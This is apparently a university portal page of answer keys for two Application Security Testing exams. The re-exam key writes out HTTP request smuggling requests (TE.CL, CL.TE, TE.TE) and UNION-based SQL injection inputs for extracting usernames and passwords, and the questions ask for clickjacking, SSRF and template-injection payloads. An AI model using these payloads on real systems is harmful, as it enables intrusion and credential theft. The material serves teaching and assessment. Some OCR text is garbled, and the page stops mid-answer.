# Application Security Testing: answer keys

Answer keys and model answers published on the portal, newest first.

## 2025-26 · Final-Exam · Sem 6 · Answer key · paper 5f8bb14548d6

- Departments: Cyber Security
- Programmes: BTech CyberSecurity 7010
- Source: `02_Question_Papers/2025/Sem_06/Final-Exam/BTech_CyberSecurity_7010/Application Security Testing/ANS_Application Security Testing(702IT0E017)_2025-2026.pdf`
- Printed on paper: max marks: 100; duration hours: 3; exam date: 07 May 2026
- Text: text (9 pages)

````text
SYNOPTICS
SVKMs NMIMS
MUKESH PATEL SCH.OF TECH.MGMT ENGG-NM-M
Programme: BACHELOR OF TECHNOLOGY - COMPUTER SCIENCE AND
ENGINEERING (CYBER SECURITY)
Year: III/Semester VI(Exam Year: 2025-2026)
Subject: Application Security Testing
Date: 07 May 2026   Time: 10:00 am to 01:00 pm (03:00 Hrs.)
Max. Marks: 100
FINAL EXAMINATION (Acad. Year:2025-2026)
Instructions:
1. This question paper contains 9 pages.
2. Question No.1 is compulsory.
3. Out of remaining questions, attempt any 4 questions.
4. In all 5 questions to be attempted.
5. Figure in right hand side indicates full marks.
6. All questions carry equal marks.
7. Assume Suitable data if necessary.
Q1   Answer briefly:
a. Explain Application Security Architecture and its key components.
(2+3marks)
•   Application Architecture is a blueprint or structure of your system that
provides a guide to how you assemble software applications and how
each of those apps interacts with one another to meet a client's
needs.
•   This   structure comprises software   modules and   all   their
components, systems , and the various interactions among them.
•   Application architecture can help you define how your software
interacts with databases and middleware to ensure your application
can scale to meet   increasing   business demands and   user
CO-1; SO-1;
requirements while maintaining stable processes.   [05]
BL-2; U1
Key Components:
• Presentation Layer:
• Manages the user interface (UI) and user interactions.
• Example: Web pages, mobile app screens.
• Business Logic Layer:
• Handles the application’s core functionality, rules, andworkflows.
• Example: Processing orders in an e-commerce app.
• Data Layer:
• Manages data storage, retrieval, and database interactions.
• Example: Storing user profiles in a database.
b. Infer the need for adaptation of SecSDL to Agile Software Development.
•   Agile and continuous software development methodologies are highly
CO-1; SO-1;
iterative,with new functionality being provided to customers   [05]
BL-2; U2
frequently- potentially asquickly as multiple times per day or
as ’slowly’ as every two to four weeks. Agilesoftware development
********** 1 **********
--- page 2 ---
methodologies can be functional requirement-centric, withthe
functionality being expressed as user stories.
• SAFECode provides security user stories
• WithaDevOpsapproachtodevelopingsoftware,developmentandopera
tionsaretightlyinte grated to enable fast and continuous delivery of
value to end users..
• Microsoft Secure DevOps
• Provide Training
• Define Requirements
• Define Metrics and Compliance Reporting
• Use Software Composition Analysis (SCA)
• Perform Threat Modelling
• Use Tools and Automation
• Keeping credentials safe
• Continuous learning and monitoring
c. Explain memory management vulnerability.
•   In   a code   corruption   attack,   the   invalid   memory
access modifiescompiled program code to attacker specified code.
•   In a control-flow hijack attack, the invalid memory access modifies
acode pointer (for instance, a return address on the stack, or a
functionpointer) to make the processor execute attacker-provided
code (adirect code injection attack), or to make the processor reuse
existingcode of the program in unexpected ways (a code-reuse
attack,also known as an indirect code injection attack, such as a
CO-3; SO-4;
return-to-libc attack, or a return oriented-programming attack).   [05]
BL-3; U3
•   In a data-only attack, the invalid memory access modifiesother data
variables of the program, possibly resulting inincreased privileges for
the attacker.
•   In an information leak attack, the invalid memory accessis a read
access, possibly resulting in the exfiltration ofinformation, either
application secrets such ascryptographic keys, or runtime metadata
such asaddresses which assist prediction   of the exact layout
ofmemory and hence may enable other attacks.
d. Explain Agent Smith Attack.
• Agent Smith attacks are carried out by luring victims into downloading
andinstalling malicious apps designed and published by attackers in the
form of games,photo editors, or other attractive tools from third-party
app stores such as 9Apps.
• Once the user has installed the app, the core malicious code inside the
CO-2; SO-1;   applicationinfects or replaces the legitimate apps in the victim’s mobile
[05]
BL-2; U5   device C&Ccommands.
• The deceptive application replaces legitimate apps such as
WhatsApp, SHAREit,and MX Player with similar infected versions.
• The application sometimes also appears to be an authentic Google
product such asGoogle Updater or Themes.
• The attacker then produces a massive volume of irrelevant and
fraudulentadvertisements on the victim’s device through the infected app
for financial gain.Attackers exploit these apps to steal critical
********** 2 **********
--- page 3 ---
information such as personalinformation, credentials, and bank details,
from the victim’s mobile device throughC&C commands.
a.   • Working and Significance of MVC Architecture compared with
Serverless Architecture.
•   [5 each]
2. Serverless Architecture:
•   Serverless means an organization does not need to invest in
or maintain physicalhardware. Instead, you rely on a trusted third-
party to manage the maintenance ofthe physical infrastructure,
including the server, network, storage, etc.
•   This approach lets your organization develop applications without
needing tomanage the underlying infrastructure.
•   Serverless includes two different perspectives:
• Function as a Service (FaaS): An evolved model that allows developers
torun code module (functions) of an application in real-time, without
gettingconcerned about the backend infrastructure or system
requirements.
• Backend as a Service (BaaS): A model where the entire backend
Q2   (database,storage, etc.) of a system is handled independently and
CO-1; SO-1;   offered as a service.This usually involves outsourcing backend services   [10]
BL-1; U1   to a third-party formaintenance and management, leaving your
organization to focus ondeveloping your core functions.
1. Model-View-Controller (MVC) Architecture:
• The Model-View-Controller (MVC) architectural pattern is a way of
breaking anapplication or to precisely separate the logic of the code,
into three parts: the model,the view, and the controller
•
• Model: This part manages the data and business logic on your site. Its
role is toretrieve the raw information from the database, organize,
and assemble it so that itcan be processed by the controller.
• View: This part focuses on the display. It is here that the data
recovered by themodel will be used to present them to the user.
•   Controller: This part manages the logic of the code that makes
decisions. When theuser interacts with the view, the request is
processed by the controller. It waits forthe user to interact with the
view to retrieve the request. Thus, it is the controllerthat will define
the display logic, and display the next view on the screen.
b. Consider the following HTTP request header template:
POST /order HTTP/1.1
Host: quickbite-website
Connection: keep-alive
Q2
Content-Type: application/x-www-form-urlencoded
CO-2; SO-1;   [10]
Content-Length: ______
BL-4; U4
Transfer-Encoding: ______
i) Craft an HTTP POST request that attempts to poison the back-end server
with the string "MALICIOUS" by exploiting a TE.CL vulnerability. Write the
request using explicit \r\n line breaks.
********** 3 **********
--- page 4 ---
ii) Analyze how the front-end proxy and back-end server interpret the
request differently in a TE.CL vulnerability. Explain how the string
"MALICIOUS" can affect subsequent requests.
iii) Briefly explain the following request smuggling vulnerabilities in one line
each: CL.TE, TE.CL , TE.TE
iv) Construct an HTTP POST request that introduces a processing delay using
the string "MALICIOUS", exploiting a CL.TE vulnerability. Use explicit \r\n
line breaks.
Craft an HTTP POST request containing the string "MALICIOUS" exploiting a
TE.TE vulnerability, where the front-end processes Transfer-Encoding and the
back-end relies on Content-Length. Use explicit \r\n line breaks.
(Answers might differ as it is a case study and students can use various
headers.)
a. Comment on Dynamic Detection techniques and relate to how and which
vulnerability it helps in detecting.
Dynamic detection refers to techniques where a program is executed in a
runtime environment, and
its behavior is monitored to identify vulnerabilities. Unlike static analysis,
it observes actual execution paths, making it effective for detecting runtime
issues.
Key Techniques in Dynamic Detection
(a) Monitoring (Runtime Analysis)
• The program is executed, and its behavior is continuously observed.
•   Tools track:
o Memory usage
o Input/output behavior
o System calls
o Control flow
Q3
Techniques used:
CO-2; SO-1;   [10]
• Runtime instrumentation
BL-3; U3
•   Taint analysis (tracking untrusted inputs)
• Execution tracing
• Memory sanitizers
Vulnerabilities Detected:
•   Buffer Overflow
o Detects illegal memory access during execution.
•   Use-after-free / Memory leaks
o   Identifies improper memory handling.
•   Injection Attacks (SQL, Command Injection)
o Tracks how user input propagates and affects execution.
• Race Conditions
o Observes unexpected behavior in concurrent execution.
•   Privilege Escalation
o Detects abnormal system calls or unauthorized access patterns.
(b) Generating Relevant Executions (Input Generation)
********** 4 **********
--- page 5 ---
• Focuses on systematically generating inputs to explore different
execution paths.
• Ensures deeper coverage of program behavior.
Techniques used:
• Fuzz Testing (random or guided inputs)
• Symbolic Execution
•   Concolic Testing (Concrete + Symbolic)
•   Test case generation
Vulnerabilities Detected:
• Input Validation Errors
o Invalid inputs reveal improper validation.
• Crash Vulnerabilities
o Unexpected inputs cause program crashes (e.g., segmentation
faults).
•   Logic Errors
o Incorrect handling of edge cases.
•   Authentication/Authorization Flaws
o Crafted inputs bypass checks.
•   Parsing Vulnerabilities
o Malformed inputs exploit parser weaknesses.
b. A web application SecureLogin.com provides a login feature where users   [10]
enter their username and password. The server constructs the following SQL
query:
SELECT * FROM users WHERE username = 'input1' AND
password = 'input2';
The application does not display database errors or query results, but the
attacker can observe differences in response time or login success/failure
messages.
i) Identify the type of SQL Injection attack that can be performed in this
scenario. Explain how it works. Compare it with: In-band SQL Injection
Q3
and Out-of-band SQL Injection
CO-3; SO-4;
ii) Write a malicious payload that allows an attacker to test true/false
BL-4; U4
conditions using Blind SQL Injection.
iii) How can an attacker determine whether the application is vulnerable to
Blind SQL Injection, based on response behavior?
iv) What conditions must exist in the application for this vulnerability to be
successfully exploited?
v) Suggest appropriate defensive coding practices, input validation
methods, and database security mechanisms to prevent such SQL
Injection attacks.
(Answers will vary and have to be checked as per assumptions considered)
a. Explain the Secure Software Lifecycle process of Touchpoints.   [10]
There are 7 practices.
Q4   1. Code Review (Static Analysis)
CO-1; SO-1;   • Analyze source code to find vulnerabilities.
BL-2; U2   • Detect issues like buffer overflow, injection flaws.
2. Architectural Risk Analysis
• Evaluate system architecture for security weaknesses.
********** 5 **********
--- page 6 ---
•   Identify design-level vulnerabilities early.
3. Penetration Testing
• Simulate real-world attacks on the system.
• Helps uncover exploitable vulnerabilities.
4. Risk-Based Security Testing
• Focus testing on high-risk areas.
•   Prioritize critical components for security checks.
5. Abuse Cases
•   Identify how attackers might misuse the system.
• Helps in designing security controls.
6. Security Requirements
• Define security needs during requirement phase.
•   Include authentication, authorization, data protection.
7. Security Operations
• Monitor and respond to security incidents post-deployment.
•   Includes patching and vulnerability management.
b. Explain Bluesnarfing and Bluebugging with example.   [10]
(5 marks each)
•   Bluesnarfing (Stealing information via Bluetooth)
•   Bluesnarfing is the theft of information from a wireless
devicethrough a Bluetooth connection, often between phones,
desktops,laptops, PDAs, and other devices.
•   This technique allows an attacker to access the victim’s contactlist,
emails, text messages, photos, videos, and business data,stored on
the device.
• Any device with its Bluetooth connection enabled and set
to“discoverable” (allowing other Bluetooth devices within range
toview the device) may be susceptible to bluesnarfing if the
Q4   vendor’ssoftware contains a certain vulnerability.
CO-2; SO-1;   •   Bluesnarfing exploits others’ Bluetooth connections without
BL-1; U5   theirknowledge
• Bluebugging (Taking over a device via Bluetooth)
• Bluebugging involves gaining remote access to a target Bluetooth-
enabled device and using its features without the victim’sknowledge
or consent.
•   Attackers compromise the target device’s security to perform
abackdoor attack prior to returning control to its owner.
• Bluebugging allows attackers to sniff sensitive corporate or
personaldata, receive calls and text messages intended for the
victim,intercept phone calls and messages, forward calls and
messages,connect to the Internet, and perform other malicious
activities suchas accessing contact lists, photos, and videos.
a. Explain Side-channel vulnerabilities.   [10]
Q5   • A side-channel is an information channel leaking information
CO-2; SO-1;   aboutthe execution of a program through effects not intended
BL-2; U3   forcommunication
•   E.g. timing, power consumption, electro-magnetic radiation, …
********** 6 **********
--- page 7 ---
• Many side-channels require physical access to the system running
theprogram under attack.
• Software-based side-channels can be read by software running on
thesame system as the program under attack
• A very recent important class of such channels exploit effects of
theprocessor implementation. – Software-based micro-architectural
side-channels
• Side-channels play an important role in the field ofcryptography,
where the abstraction gap between
•   (1) the mathematical (or source code level) description of
acryptographic algorithm and
•   (2) the physical implementation of that algorithm, has been shownto
be relevant for security.
•   It was demonstrated that, unless an implementationcarefully guards
against this, side-channels based onpower consumption or execution
time can easily leakthe cryptographic key used during the execution
of anencryption algorithm. This breaks the securityobjectives of
encryption   for an attacker model where theattacker can
physically monitor the encryption process.
b. An attacker wants to increase the popularity of a post on a social media   [10]
platform called ShareZone by tricking users into clicking the “Like” or
“Follow” button without their knowledge.
Questions:
i.   Explain how a clickjacking attack can be used to artificially increase
likes or followers on a social media platform.
ii.   Design a malicious web page that hides the “Like” or “Follow” button
of ShareZone using an iframe. Explain the important parts of the
Q5
code used in the attack.
CO-3; SO-1;
iii. Why does allowing the social media page to be embedded within
BL-4; U5
another website make this attack feasible?
iv.   Analyze the potential impact of such attacks on user trust, platform
integrity, and content credibility.
v.   Suggest suitable security headers, browser protections, and UI
design practices that ShareZone should implement to prevent
clickjacking attacks.
(Answers may vary as per assumptions taken).
a. Compare between SAST, RASP and DAST application security tools and   [10]
solutions.
• Explanation of each (3 marks)
• Working of any one (1 mark)
• SAST is known as a “white-box” testing method that testssource code
Q6
and   related   dependencies   statically, early   in   thesoftware
CO-1; SO-1;
development lifecycle (SDLC), to identify flawsand vulnerabilities in
BL-1; U1
the code that pose a security threat.
• SAST enables developers to detect security flaws orweaknesses in
their custom source code. The objective iseither to comply with a
requirement or regulation (forexample, Payment Card Industry Data
SecurityStandard PCI/DSS) or to achieve better understanding ofone’s
********** 7 **********
--- page 8 ---
software risk. Understanding security flaws is the firststep toward
remediating security flaws and thus reducingsoftware risk.
• DAST is known as a “black-box” testing method thattests the code
when it’s running and doesn’t have accessto the source code. It is
concerned with identifyingruntime issues and weaknesses in software
andapplications. DAST testing is performed later in theSDLC, when
software and applications are actuallyworking. It is a hacker’s, rather
than a developer’sperspective. DAST is dynamic, because tests
asapplications run, so it needs a working version of theapplication for
it to perform testing.
• RASP technology can analyze user behavior andapplication traffic at
runtime. It aims to help detect andprevent cyber threats by achieving
visibility intoapplication source code and analyzing vulnerabilitiesand
weaknesses. Integrates into an application to detectand block threats
in real time during runtime.
• RASP tools can identify security weaknesses that havealready been
exploited, terminate these sessions, andissue alerts to provide active
protection.
b. A web application DocPreviewer.com allows users to preview documents by   [10]
providing a URL. The server fetches the document from the given URL and
displays a preview:
POST /previewDocument HTTP/1.1
Host: docpreviewer.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
docUrl=http://files.docpreviewer.com/docs/sample.pdf
An attacker suspects that the server can be tricked into accessing internal
network resources.
Q6
i) Identify the type of attack that can be performed to access an internal
CO-2; SO-1;
resource such as http://localhost:8080/admin. Explain how the attack
BL-1; U4
works.
ii) Rewrite the HTTP request to craft a malicious request that forces the
server to access the internal resource.
iii) What sensitive information or advantages could the attacker gain by
successfully exploiting this vulnerability?
iv) What defensive mechanisms and validation techniques should the
application implement to prevent such attacks?
Explain the different types or variations of this attack (e.g., basic SSRF, blind
SSRF, etc.).
(Answer will vary as per assumptions taken)
a. Explain one of the Frameworks to assess the secure software lifecycle.   [10]
Q7   (Any One for 10 marks)
CO-2; SO-1;   • SAMM
BL-1; U2   • BSIMM
• Common Criteria
b. A travel booking platform TripNest.com allows users to leave feedback   [10]
about hotels. The feedback message is displayed dynamically using a server-
side template engine.
********** 8 **********
--- page 9 ---
Example template rendering code:
Welcome {{ user_name }}! Your feedback has been recorded:
{{ feedback_message }}
The application directly inserts user-supplied input into the template before
rendering it.
i)   Identify the type of vulnerability that can arise from this
implementation. Explain how an attacker can exploit it.
ii) Write a malicious template payload that can be injected into the
feedback_message field to test whether the server evaluates template
expressions.
iii) If the attack is successful, what kind of information disclosure or system-
level access could the attacker achieve?
iv) What conditions or misconfigurations must exist in the application for
this attack to be possible?
Recommend appropriate secure coding practices, input handling
techniques, and template engine configurations that should be
implemented to prevent such vulnerabilities.
(Answers will vary as per assumptions taken).
********** 9 **********
````

## 2025-26 · Re-Exam · Sem 6 · Answer key · paper 5fe287cb12b6

- Departments: Cyber Security
- Programmes: BTech CyberSecurity 7010
- Source: `02_Question_Papers/2025/Sem_06/Re-Exam/BTech_CyberSecurity_7010/Application Security Testing/ANS_Application Security Testing(702IT0E017)_2025-2026.pdf`
- Printed on paper: max marks: 100; duration hours: 3; exam date: 03 Jul 2026
- Text: mixed (19 pages), mean OCR confidence 38.5

````text
SYNOPTICS
SVKMs NMIMS
MUKESH PATEL SCH.OF TECH.MGMT ENGG-NM-M
Programme: BACHELOR OF TECHNOLOGY - COMPUTER SCIENCE AND
ENGINEERING (CYBER SECURITY)
Year: III/Sem 6 Re-exam(Exam Year: 2025-2026)
Subject: Application Security Testing
Date: 03 Jul 2026   Time: 10:00 am to 01:00 pm (03:00 Hrs.)
Max. Marks: 100
RE EXAMINATION (Acad. Year:2025-2026)
Instructions:
1. This question paper contains 19 pages.
2. Question No.1 is compulsory.
3. Out of remaining questions, attempt any 4 questions.
4. In all 5 questions to be attempted.
5. Figure in right hand side indicates full marks.
6. All questions carry equal marks.
7. Assume Suitable data if necessary.
Q1   Answer briefly:
a.   Infer the need for securing information and comment on any TWO
Information Security Attack Vectors.
Need-1 Mark and Attack Vector – 2marks each
Need:
· Evolution of technology leading to ease of use.
· Relying on computers for accessing, providing or storing information.
· Increased network environment and network-based applications.
· Direct impact of security breach on the corporate asset base and goodwill.
CO-1; SO-1;   · Increased complexity of computer infrastructure administration and
[05]
BL-2; U1   management.
Information Security Attack Vectors: Explain Any TWO
· Cloud Computing Threats
· Advanced Persistent Threats (APT)
· Viruses and Worms
· Ransomware
· Mobile Threats
· Botnet · Insider Attack · Phishing · Web Application Threats · IoT Threats
b. Infer the need for adaptation of SecSDL to Internet of Things (IoT).
The adaptation of Secure Software Development Lifecycle (SecSDL) to the
Internet of Things (IoT) is necessary due to the unique security challenges
posed by IoT environments. IoT devices are highly heterogeneous, resource-
constrained, and often deployed in physically exposed locations, making
CO-1; SO-1;
them vulnerable to attacks such as unauthorized access, data breaches, and   [05]
BL-2; U2
device tampering. Additionally, issues like default passwords, lack of secure
update mechanisms, and insecure communication further increase risks.
Therefore, incorporating security practices such as secure authentication,
encrypted communication, adherence to standards like NIST guidelines (e.g.,
avoiding default credentials, using MUD specifications, and enabling secure
********** 1 **********
--- page 2 ---
updates) within SecSDL ensures that IoT systems are designed with security
from the outset, leading to more robust and trustworthy deployments.
Devices must be securely provisioned, connectivity between these devices and
the cloud must be secure, and data in storage and in transit must be protected.
The US National Institute of Standards and Technology (NIST) recommends four
practices for the development of secure IoT-based systems:
1. Use of Radio-Frequency Identification (RFID) tags: Unique identifiers can
mitigate   the   problem   of   counterfeits,   data
tampered, deleted, dropped or transmitted insecurely. Readers activate
a tag, causing the device to broadcast radio waves within a bandwidth
reserved for RFID usage by governments internationally. The radio
waves transmit identifiers or codes that reference unique information
associated with the device.
2. Not
using or allowing theuse of default passwords or credentials: Recomme
nded practices are to require passwords to be changed or to design in
intuitive interfaces. Manufacturers can randomise passwords per
device rather than having a small number of default passwords.
Use of the Manufacturer Usage Description (MUD) specification: MUD
allows manufacturers to specify authorised and expected user traffic
patterns to reduce the threat surface of an IoT device by restricting
communications to/from the device to sources and destinations intended by
the manufacturer.
c.   Jot down the reasons for API Vulnerability.
(Any five 5 marks)
1. Lack of Authentication & Authorization: APIs without proper access
control allow unauthorized users to access sensitive data.
2. Weak Input Validation: Failure to validate inputs leads to attacks like
SQL injection, command injection.
3. Excessive Data Exposure: APIs return more data than necessary,
exposing sensitive information.
4. Insecure Endpoints: Poorly protected API endpoints can be directly
CO-3; SO-4;   accessed and exploited.
[05]
BL-3; U3   5. Improper Rate Limiting: Absence of rate limiting enables brute-force
attacks and DoS attacks.
6. Security Misconfiguration: Default settings, open ports, or verbose
error messages expose vulnerabilities.
7. Lack of Encryption: Data transmitted without HTTPS can be
intercepted (Man-in-the-Middle attacks).
8. Insufficient Logging & Monitoring: Attacks go undetected due to lack
of proper tracking.
9. Use   of   Outdated   Components:   APIs   using   vulnerable
libraries/frameworks are easily exploitable.
d. Infer BYOD Benefits.
(1 Mark for each benefit)
CO-2; SO-1;   • Increased Productivity: Employees are more efficient as they are
[05]
BL-2; U5   familiar with their own devices and often use the latest technology.
• Employee Satisfaction: Users prefer working on personal devices,
leading to greater comfort and job satisfaction.
********** 2 **********
--- page 3 ---
• Work Flexibility: Employees can work from anywhere using a single
device for both personal and professional tasks.
• Lower Costs: Organizations save money on device procurement and
maintenance since employees use their own devices.
• Access to Latest Technology: Employees frequently upgrade their
personal devices, allowing organizations to benefit from modern
hardware and software features without additional investment.
a. Working and Significance of Serverless Architecture compared with Single-
page Architecture.
(3 Working+ 2 Significance for each architecture)
Working of Serverless Architecture:
How it Works
• The application backend is built using Function-as-a-Service (FaaS).
• Flow:
1. Client sends request (web/mobile app)
2. Request hits API Gateway
3. Event triggers a serverless function (e.g., AWS Lambda)
4. Function executes logic and interacts with database/storage
5. Response is returned to client
Significance:
•   Auto-scaling: Handles variable loads automatically
•   Cost-efficient: Pay only for execution time
Q2   • Reduced DevOps overhead: No server management
CO-1; SO-1;   • High availability: Built-in fault tolerance   [10]
BL-1; U1   •   Faster deployment: Focus only on code
Working of Single-page Architecture:
How it Works
•   Entire application loads once in the browser.
• Flow:
1. Browser loads initial HTML, CSS, JS
2. JavaScript framework (React, Angular, Vue) renders UI
3. User interactions update UI dynamically (no full reload)
4. Data is fetched via APIs (AJAX/REST)
Significance:
• Fast user experience: No full page reloads
• Rich interactivity: Dynamic UI updates
• Reduced server load: Client handles rendering
• Better UX: Smooth navigation
b. Consider the following HTTP request header template:
POST /transfer HTTP/1.1
Host: securebank.com
Connection: keep-alive
Q2
Content-Type: application/x-www-form-urlencoded
CO-2; SO-1;   [10]
Content-Length: ______
BL-4; U4
Transfer-Encoding: ______
i) Craft an HTTP POST request that poisons the back-end server with the
string "POISON" by exploiting a TE.CL vulnerability. Write the request
using explicit \r\n line breaks.
********** 3 **********
--- page 4 ---
ii) Compare the request smuggling variants CL.TE, TE.CL, and TE.TE,
highlighting how each attack works and how the mismatch between
Content-Length and Transfer-Encoding enables request smuggling.
iii) Craft an HTTP POST request that introduces a time delay on the back-end
server while sending the string "POISON", exploiting a CL.TE vulnerability.
Write the request using explicit \r\n line breaks.
iv) Craft an HTTP POST request containing the string "POISON" that exploits
a TE.TE vulnerability. Use explicit \r\n line breaks.
v) Analyze the TE.TE attack, explaining how the front-end and back-end
servers interpret the request differently and how the string POISON is
injected into the back-end request queue.
i)   TE.CL
POST / HTTP/1.1\r\n
Host: vulnerable-website\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 3\r\n
Transfer-Encoding: chunked\r\n
\r\n
6\r\n
POISON\r\n
0\r\n
\r\n
ii)   Explanation
CL.TE: The front-end uses Content-Length while the back-end uses Transfer-
Encoding, allowing attackers to hide extra chunked data that the backend
interprets differently.
TE.CL: The front-end uses Transfer-Encoding while the back-end uses
Content-Length, leaving leftover bytes that become the start of the next
request (queue poisoning).
TE.TE: Both servers use Transfer-Encoding, but interpret it differently,
causing inconsistent request boundaries that enable request smuggling.
iii)   CL.TE Time Delay
POST / HTTP/1.1\r\n
Host: vulnerable-website\r\n
Connection: keep-alive\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 11\r\n
Transfer-Encoding: chunked\r\n
\r\n
6\r\n
POISON\r\n
iv)   TE.TE
POST / HTTP/1.1\r\n
Host: vulnerable-website\r\n
Connection: keep-alive\r\n
********** 4 **********
--- page 5 ---
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 3\r\n
Transfer-Encoding: cow\r\n
\r\n
6\r\n
POISON\r\n
0\r\n
\r\n
v)   Analysis of TE.TE
The front-end server processes the Transfer-Encoding header, and therefore
interprets the request body using chunked encoding.
1. The first chunk is declared as 6 bytes, which corresponds to the string
POISON.
2. The next chunk 0 indicates the end of the chunked body.
3. The request is then forwarded to the back-end server.
The back-end server ignores the non-standard Transfer-Encoding: cow
header and instead processes the Content-Length: 3 header.
•   It therefore reads only 3 bytes of the request body.
• The remaining bytes beginning with POISON are left unprocessed.
These leftover bytes are interpreted by the back-end server as the start of
the next HTTP request, which results in backend request queue poisoning.
This mismatch between how the front-end and back-end servers interpret
the Transfer-Encoding header allows the attacker to successfully perform a
TE.TE request smuggling attack.
a. How would sandboxing help in mitigating race condition vulnerability and
memory management vulnerability?
(5 marks each)
Sandboxing is a security mechanism where a program runs in an isolated,
restricted environment with:
• Limited memory access
•   Controlled resource usage
•   Restricted system calls
Even if the program is vulnerable, the damage is contained within the
sandbox.
Q3   Sandboxing vs Race Condition Vulnerability
CO-2; SO-1;   Race Condition (Problem)   [10]
BL-3; U3   • Occurs when multiple processes/threads access shared resources
without proper synchronization.
• Leads to:
o Data corruption
o Privilege escalation
o TOCTOU (Time-of-check to time-of-use) attacks
How Sandboxing Helps
(a) Resource Isolation
• Each process gets separate resource space.
• Reduces shared access, minimizes race opportunities.
(b) Restricted System Calls
•   Limits access to:
********** 5 **********
--- page 6 ---
o   File systems
o Shared memory
• Prevents exploitation of timing gaps.
(c) Controlled Concurrency
• Sandboxes can enforce:
o Execution policies
o Limited thread interaction
(d) Damage Containment
• Even if a race condition is exploited:
o Impact is confined within sandbox
o Cannot affect system-wide resources
3. Sandboxing vs Memory Management Vulnerabilities
Memory Vulnerabilities (Problem)
• Examples:
o Buffer overflow
o Use-after-free
o Dangling pointers
• Lead to:
o Arbitrary code execution
o System compromise
How Sandboxing Helps
(a) Memory Isolation
• Each sandbox has separate memory space.
• Prevents access to:
o Kernel memory
o Other processes
(b) Execution Restrictions
•   Limits execution of injected code:
o No arbitrary system-level execution
o Restricted privileges
(c) Access Control
• Even if memory is corrupted:
o Sensitive data remains inaccessible
o System calls are restricted
(d) Crash Containment
• Vulnerable program may crash, but:
o Does not crash entire system
o No propagation of attack
b. A web application displays user profile information based on a user ID   [10]
entered in the URL:
http://example.com/profile?id=10
The server executes the following query:
Q3
SELECT name FROM users WHERE id = 'id';
CO-3; SO-4;
BL-4; U4   The application directly displays the query results on the webpage.
i) Identify the type of SQL injection attack and explain how it works.
Compare it with Blind SQL injection and Out-of-band SQL injection.
This is an In-band SQL Injection attack.
********** 6 **********
--- page 7 ---
In this attack, the attacker retrieves data using the same communication
channel.
Two common types:
• Union-based SQL injection
• Error-based SQL injection
Type   Description
Data retrieved through the same web
In-band SQL Injection
application response
Data inferred from application
Blind SQL Injection
behaviour
Data retrieved through external
Out-of-band SQL Injection
channels
ii) Write a malicious input that exploits the vulnerability to retrieve
username, password from login using a UNION-based SQL injection.
Malicious input:
‘ UNION SELECT username FROM login--
‘ UNION SELECT password FROM login--
Modified query:
SELECT   name   FROM   users   WHERE   id='10'
UNION SELECT username||’ ‘||password FROM login--;
This causes the database to return usernames and passwords on the single
attribute name from the login table.
iii) How can the attacker determine whether the application is vulnerable to
In-band SQL injection?
The attacker tests inputs such as:
' OR '1'='1'--
or
ORDER BY 1--
If the webpage displays:
• SQL errors
•   additional database records
• unexpected data
the attacker confirms the vulnerability.
iv) What conditions must exist in the application for this attack to succeed?
This attack succeeds when:
• The application displays database query results
• User input is not sanitized
• The attacker can determine the number of columns
• Database permissions allow data retrieval
********** 7 **********
--- page 8 ---
v) What defensive techniques should developers implement to prevent this
attack?
1. Prepared statements
Example (PHP PDO):
$stmt = $pdo->prepare("SELECT name,email FROM users WHERE id=?");
$stmt->execute([$id]);
2. Input validation
3. Least privilege database access
4. Hide database error messages
5. Use Web Application Firewall (WAF)
a. Explain the SDL practices incorporated by Microsoft to improve the security   [10]
of their products.
(Explain Any Five 2 Marks Each)
The Microsoft SDL is a structured process integrated into software
development to reduce vulnerabilities and improve product security.
It embeds security practices into every phase of the lifecycle.
Key SDL Practices
1. Training
• Developers are trained in secure coding practices and common
vulnerabilities.
• Covers topics like:
o Input validation
o Authentication & authorization
o Cryptography basics
Security Benefit:
• Reduces introduction of vulnerabilities like buffer overflows,
injection attacks.
Q4
CO-1; SO-1;
2. Requirements Phase
BL-2; U2
• Define security requirements along with functional requirements.
•   Establish:
o Security goals
o Compliance requirements
o Privacy needs
Security Benefit:
• Prevents missing security controls early (e.g., encryption, access
control).
3. Design Phase (Threat Modeling)
• Perform Threat Modeling to identify risks.
• Microsoft uses models like STRIDE:
o Spoofing
o Tampering
o Repudiation
o Information Disclosure
o Denial of Service
o Elevation of Privilege
********** 8 **********
--- page 9 ---
Security Benefit:
•   Identifies design-level flaws before implementation.
4. Implementation Phase (Secure Coding)
• Follow secure coding standards.
• Use:
o Approved libraries
o   Static code analysis tools
o Code reviews
Security Benefit:
• Prevents coding vulnerabilities such as:
o Memory corruption
o Improper error handling
5. Verification Phase (Security Testing)
• Perform rigorous testing:
o Dynamic testing
o Fuzz testing
o Penetration testing
Security Benefit:
• Detects runtime issues like:
o Crashes
o Input validation flaws
o Authentication bypass
6. Release Phase
• Conduct Final Security Review (FSR).
• Ensure:
o No critical vulnerabilities remain
o Secure configurations are enabled
Security Benefit:
• Ensures product is safe before deployment.
7. Response Phase
• Prepare for incident response after release.
•   Activities include:
o Vulnerability reporting process
o Patch management
o Security updates
Security Benefit:
• Enables quick mitigation of newly discovered threats.
b. Describe Mobile Attack Vectors/Vulnerabilities (Any Two)   [10]
Mobile attack vectors refer to the different paths or methods through
Q4
which attackers compromise mobile devices, applications, or data. The
CO-2; SO-1;
diagram highlights four major categories:
BL-1; U5
1. Malware (Attack via Malicious Software)
********** 9 **********
--- page 10 ---
Description:
Malware includes any malicious application or code installed on a mobile
device to disrupt operations or steal data.
Examples:
•   Viruses and rootkits
• Trojan apps disguised as legitimate apps
•   OS-level modifications (rooting/jailbreaking exploitation)
Vulnerabilities Exploited:
• Weak app vetting (third-party app stores)
• OS vulnerabilities
•   Excessive app permissions
Impact:
• Unauthorized access
• Data theft
• Device control (botnets)
2. Data Tampering (Integrity Attacks)
Description:
Attackers modify data or application behavior without user consent.
Examples:
•   Altering app data by another malicious app
• Unauthorized modification of stored or transmitted data
•   Exploits on jailbroken/rooted devices
Vulnerabilities Exploited:
• Lack of integrity checks
• Insecure storage (no encryption/signatures)
• Weak inter-app communication
Impact:
•   Incorrect transactions (e.g., banking apps)
• Manipulated app logic
• Loss of trust in system integrity
3. Data Exfiltration (Confidentiality Breach)
Description:
Sensitive data is illegally transferred out of the device.
Examples:
•   Extracting data from app memory or logs
• Email/data stream interception
• Screen scraping or clipboard access
• Copying data to USB or external storage
Vulnerabilities Exploited:
• Poor encryption
• Insecure APIs and network communication
• Over-permissioned apps
Impact:
